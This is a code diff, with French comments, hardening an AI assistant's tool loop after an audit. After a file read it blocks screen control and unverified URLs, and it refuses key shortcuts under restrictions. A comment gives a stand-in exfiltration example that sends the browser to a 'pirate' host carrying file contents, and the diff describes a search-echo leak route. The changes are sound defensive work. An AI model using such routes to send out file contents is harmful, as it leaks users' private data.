@@ -754,7 +754,9 @@ async function conversation(
 
   const memoryTitles = await listMemoryTitles()
   const profile = await getProfile()
-  const runTool = createToolExecutor(onReminderFire, profile?.visionModel ?? config.ollama.visionModel, onLog, signal, onImage, onWebActivity)
+  const runTool = createToolExecutor(onReminderFire, profile?.visionModel ?? config.ollama.visionModel, onLog, signal, onImage, onWebActivity, {
+    singleKeysOnly: Boolean(restrictions)
+  })
   const isToolAllowed = (name: string): boolean => !restrictions || restrictions.allowedTools.has(name)
   // Étape 418 : les outils MCP de Léo, seulement sans restriction (jamais depuis le téléphone ni en duel, où la liste
   // des outils permis est fixée), au plus quelques-uns par demande (shared/mcp.ts).
@@ -778,10 +780,20 @@ async function conversation(
   const executeTool: typeof runTool = async (name, args) => {
     if (fileRead && extra && extraNames.has(name)) throw new Error(t('files.noSendAfterRead'))
     if (fileRead && name === 'read_web_page' && !knownUrls.has(cleanUrl(String(args.url ?? '')))) throw new Error(t('files.noSendAfterRead'))
+    // Étape 520 (audit) : le pilotage de l'écran mène le vrai navigateur à n'importe quelle adresse (« va sur
+    // https://pirate/?d=<contenu> ») — après la lecture d'un fichier, il est refusé lui aussi.
+    if (fileRead && name === 'computer_use_task') throw new Error(t('files.noSendAfterRead'))
     // Étape 508 : en duel (vrai PC) ou depuis le téléphone, une touche seule, jamais un raccourci (alt+f4, ctrl+w…).
-    if (restrictions && name === 'press_key' && String(args.key ?? '').includes('+')) throw new Error(restrictions.refusalFor?.(name) ?? restrictions.refusal)
+    // Étape 520 : le vrai motif dit (« raccourci refusé »), plus « outil indisponible » ; le pilotage de l'écran est
+    // couvert dans pressKey (keyPolicy).
+    if (restrictions && name === 'press_key' && String(args.key ?? '').includes('+')) throw new Error(t('input.comboRefused', { key: String(args.key) }))
     const result = await runToolChecked(name, args)
-    if (name === 'search_web') for (const url of urlsIn(String(result))) knownUrls.add(url)
+    // Étape 520 (audit) : une recherche sans résultat REPRENAIT la requête (« Aucun résultat pour « https://pirate… » ») :
+    // une adresse écrite dans la requête elle-même n'est jamais une adresse « trouvée par la recherche ».
+    if (name === 'search_web') {
+      const asked = new Set(urlsIn(String(args.query ?? '')))
+      for (const url of urlsIn(String(result))) if (!asked.has(url)) knownUrls.add(url)
+    }
     if (name === 'files' && String(args.action ?? '').trim().toLowerCase() === 'read') fileRead = true
     return result
   }
